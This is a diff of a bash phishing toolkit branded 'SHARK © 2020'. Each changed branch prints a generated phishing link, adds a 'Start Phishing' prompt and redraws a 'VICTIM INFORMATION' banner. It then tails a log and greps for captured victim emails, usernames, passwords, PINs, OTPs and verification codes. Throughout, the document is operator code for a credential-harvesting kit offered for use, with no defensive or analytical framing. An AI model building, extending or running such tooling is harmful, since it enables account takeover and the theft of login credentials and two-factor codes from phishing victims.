@@ -168,9 +168,9 @@ ash() {
 			    clear
 			    echo 
 			    echo
-			    echo -e "\e[96m=======================\e[92m VICTIM INFORMATION \e[96m====================== \e[93m"  
+			    echo -e "\e[96m=======================\e[92m VICTIM INFORMATION \e[96m======================== \e[93m"  
 			    echo 
-			    echo -e "\e[96m=======================\e[92m    SHARK © 2020    \e[96m====================== \e[92m"
+			    echo -e "\e[96m=======================\e[92m    SHARK © 2020    \e[96m======================== \e[92m"
 			    echo
 			    tail -f log.txt | grep -e "email" -e "pass" -e "approvals_code"
 	
@@ -197,10 +197,13 @@ ash() {
                            printf "\e[91m[\e[32m*\e[91m]\e[93m Your Phishing link :\e[0m\e[92m %s\e[0m\n" $link
                            echo ""
 		           ash
-		           echo " "
-			   echo " "
-			   sleep 2
-                           echo -e "\e[96m<<<<<<<<<<<<<<<<<<<<<<<\e[92m VICTIM INFORMATION \e[96m>>>>>>>>>>>>>>>>>>>>>>>>>>>>>  \e[93m"
+			   read -p $'\e[91m[\e[92m~\e[91m]\e[93m Start Phishing\e[92m(Enter) \e[93mor Close\e[92m[(Ctrl+c) :\e[m ' listner
+			   clear
+			   echo 
+			   echo
+			   echo -e "\e[96m=======================\e[92m VICTIM INFORMATION \e[96m======================== \e[93m"  
+			   echo 
+			   echo -e "\e[96m=======================\e[92m    SHARK © 2020    \e[96m======================== \e[92m"
                            echo 
                            tail -f log.txt | grep -e "id" -e "password"      
 
@@ -227,10 +230,13 @@ ash() {
 			   printf "\e[91m[\e[92m*\e[91m]\e[93m Your Phishing link :\e[0m\e[92m %s\e[0m\n" $link
 			   echo "" 
 			   ash
-			   echo " "
-			   echo " "
-			   sleep 2
-			   echo -e "\e[96m<<<<<<<<<<<<<<<<<<<<<<<\e[92m VICTIM INFORMATION \e[96m>>>>>>>>>>>>>>>>>>>>>>>>>>>>>  \e[93m"
+			   read -p $'\e[91m[\e[92m~\e[91m]\e[93m Start Phishing\e[92m(Enter) \e[93mor Close\e[92m[(Ctrl+c) :\e[m ' listner
+			   clear
+			   echo 
+			   echo
+			   echo -e "\e[96m=======================\e[92m VICTIM INFORMATION \e[96m======================== \e[93m"  
+			   echo 
+	        	   echo -e "\e[96m=======================\e[92m    SHARK © 2020    \e[96m======================== \e[92m"
 			   echo
 			   tail -f log.txt
 			   
@@ -257,10 +263,13 @@ ash() {
 			  printf "\e[91m[\e[92m*\e[91m]\e[93m Your Phishing link :\e[0m\e[92m %s\e[0m\n" $link  
 			  echo ""  
 			  ash 
-			  echo " "
-			  echo " "
-			  sleep 2
-			  echo -e "\e[96m<<<<<<<<<<<<<<<<<<<<<<<\e[92m VICTIM INFORMATION \e[96m>>>>>>>>>>>>>>>>>>>>>>>>>>>>>  \e[93m"
+			  read -p $'\e[91m[\e[92m~\e[91m]\e[93m Start Phishing\e[92m(Enter) \e[93mor Close\e[92m[(Ctrl+c) :\e[m ' listner
+			  clear
+			  echo 
+			  echo
+			  echo -e "\e[96m=======================\e[92m VICTIM INFORMATION \e[96m======================== \e[93m"  
+			  echo 
+			  echo -e "\e[96m=======================\e[92m    SHARK © 2020    \e[96m======================== \e[92m"
 			  echo
 			  tail -f log.txt | grep -e "Email_or_Phone" -e "password" -e "verificationCode"
 
@@ -287,10 +296,13 @@ ash() {
 		          printf "\e[91m[\e[92m*\e[91m]\e[93m Your Phishing link :\e[0m\e[92m %s\e[0m\n" $link
 		          echo "" 
 		          ash
-		          echo " "
-			  echo " "
-			  sleep 2
-		          echo -e "\e[96m<<<<<<<<<<<<<<<<<<<<<<<\e[92m VICTIM INFORMATION \e[96m>>>>>>>>>>>>>>>>>>>>>>>>>>>>>  \e[93m"
+			  read -p $'\e[91m[\e[92m~\e[91m]\e[93m Start Phishing\e[92m(Enter) \e[93mor Close\e[92m[(Ctrl+c) :\e[m ' listner
+			  clear
+			  echo 
+			  echo
+			  echo -e "\e[96m=======================\e[92m VICTIM INFORMATION \e[96m======================== \e[93m"  
+			  echo 
+			  echo -e "\e[96m=======================\e[92m    SHARK © 2020    \e[96m======================== \e[92m"
 			  echo
 		          tail -f log.txt | grep -e "number" -e "otp" -e "OTP"
 
@@ -317,10 +329,13 @@ ash() {
 		          printf "\e[91m[\e[92m*\e[91m]\e[93m Your Phishing link :\e[0m\e[92m %s\e[0m\n" $link
 		          echo "" 
 		          ash
-			  echo " "
-		          echo " "
-			  sleep 2
-		          echo -e "\e[96m<<<<<<<<<<<<<<<<<<<<<<<\e[92m VICTIM INFORMATION \e[96m>>>>>>>>>>>>>>>>>>>>>>>>>>>>>  \e[93m"
+			  read -p $'\e[91m[\e[92m~\e[91m]\e[93m Start Phishing\e[92m(Enter) \e[93mor Close\e[92m[(Ctrl+c) :\e[m ' listner
+			  clear
+			  echo 
+			  echo
+			  echo -e "\e[96m=======================\e[92m VICTIM INFORMATION \e[96m======================== \e[93m"  
+			  echo 
+			  echo -e "\e[96m=======================\e[92m    SHARK © 2020    \e[96m======================== \e[92m"
 			  echo
 		          tail -f log.txt | grep -e "email" -e "password" -e "OTP"
   
@@ -356,10 +371,13 @@ ash() {
                                 printf "\e[91m[\e[92m*\e[91m]\e[93m Your Phishing link :\e[0m\e[92m %s\e[0m\n" $link
                                 echo ""
 			        ash
-			        echo " "
-			        echo " "
-			        sleep 2
-                                echo -e "\e[96m<<<<<<<<<<<<<<<<<<<<<<<\e[92m VICTIM INFORMATION \e[96m>>>>>>>>>>>>>>>>>>>>>>>>>>>>>  \e[93m"
+				read -p $'\e[91m[\e[92m~\e[91m]\e[93m Start Phishing\e[92m(Enter) \e[93mor Close\e[92m[(Ctrl+c) :\e[m ' listner
+			        clear
+			        echo 
+			        echo
+			        echo -e "\e[96m=======================\e[92m VICTIM INFORMATION \e[96m======================== \e[93m"  
+			        echo 
+			        echo -e "\e[96m=======================\e[92m    SHARK © 2020    \e[96m======================== \e[92m"
                                 echo 
                                 tail -f log.txt | grep -e "email" -e "username" -e "password" -e "otp"
 		
@@ -383,10 +401,13 @@ ash() {
                                 printf "\e[91m[\e[92m*\e[91m]\e[93m Your Phishing link :\e[0m\e[92m %s\e[0m\n" $link
                                 echo ""
 			        ash
-				echo " "
-			        echo " "
-				sleep 2
-                                echo -e "\e[96m<<<<<<<<<<<<<<<<<<<<<<<\e[92m VICTIM INFORMATION \e[96m>>>>>>>>>>>>>>>>>>>>>>>>>>>>>  \e[93m"
+				read -p $'\e[91m[\e[92m~\e[91m]\e[93m Start Phishing\e[92m(Enter) \e[93mor Close\e[92m[(Ctrl+c) :\e[m ' listner
+			        clear
+			        echo 
+			        echo
+			        echo -e "\e[96m=======================\e[92m VICTIM INFORMATION \e[96m======================== \e[93m"  
+			        echo 
+			        echo -e "\e[96m=======================\e[92m    SHARK © 2020    \e[96m======================== \e[92m"
                                 echo 
                                 tail -f log.txt | grep -e "email" -e "loginPassword" -e "mobileNumber" -e "otp"
 				fi
@@ -415,10 +436,13 @@ ash() {
                           printf "\e[91m[\e[92m*\e[91m]\e[33m Your Phishing link :\e[0m\e[92m %s\e[0m\n" $link
                           echo ""
 		          ash
-		          echo " "
-			  echo " "
-			  sleep 2
-                          echo -e "\e[96m<<<<<<<<<<<<<<<<<<<<<<<\e[92m VICTIM INFORMATION \e[96m>>>>>>>>>>>>>>>>>>>>>>>>>>>>>  \e[93m"
+			  read -p $'\e[91m[\e[92m~\e[91m]\e[93m Start Phishing\e[92m(Enter) \e[93mor Close\e[92m[(Ctrl+c) :\e[m ' listner
+			  clear
+			  echo 
+			  echo
+			  echo -e "\e[96m=======================\e[92m VICTIM INFORMATION \e[96m======================== \e[93m"  
+			  echo 
+			  echo -e "\e[96m=======================\e[92m    SHARK © 2020    \e[96m======================== \e[92m"
                           echo 
                           tail -f log.txt | grep -e "userLoginId" -e "password" -e "OTP"                 
 
@@ -445,10 +469,13 @@ ash() {
                            printf "\e[91m[\e[92m*\e[91m]\e[93m Your Phishing link :\e[0m\e[92m %s\e[0m\n" $link
                            echo ""
 		           ash
-		           echo " "
-			   echo " "
-			   sleep 2
-                           echo -e "\e[96m<<<<<<<<<<<<<<<<<<<<<<<\e[92m VICTIM INFORMATION \e[96m>>>>>>>>>>>>>>>>>>>>>>>>>>>>>  \e[93m"
+			   read -p $'\e[91m[\e[92m~\e[91m]\e[93m Start Phishing\e[92m(Enter) \e[93mor Close\e[92m[(Ctrl+c) :\e[m ' listner
+			   clear
+			   echo 
+			   echo
+			   echo -e "\e[96m=======================\e[92m VICTIM INFORMATION \e[96m======================== \e[93m"  
+			   echo 
+		           echo -e "\e[96m=======================\e[92m    SHARK © 2020    \e[96m======================== \e[92m"
                            echo 
                            tail -f log.txt | grep -e "username" -e "password" -e "password" -e "pin" -e "Pin"                        
 
@@ -475,10 +502,13 @@ ash() {
                            printf "\e[91m[\e[92m*\e[91m]\e[93m Your Phishing link :\e[0m\e[92m %s\e[0m\n" $link
                            echo 
 		           ash
-		           echo 
+			   read -p $'\e[91m[\e[92m~\e[91m]\e[93m Start Phishing\e[92m(Enter) \e[93mor Close\e[92m[(Ctrl+c) :\e[m ' listner
+			   clear
 			   echo 
-			   sleep 2
-                           echo -e "\e[96m<<<<<<<<<<<<<<<<<<<<<<<\e[92m VICTIM INFORMATION \e[96m>>>>>>>>>>>>>>>>>>>>>>>>>>>>>  \e[93m"
+			   echo
+			   echo -e "\e[96m=======================\e[92m VICTIM INFORMATION \e[96m======================== \e[93m"  
+			   echo 
+			   echo -e "\e[96m=======================\e[92m    SHARK © 2020    \e[96m======================== \e[92m"
                            echo 
                            tail -f log.txt | grep -e "email" -e "password" -e "OTP"  
 
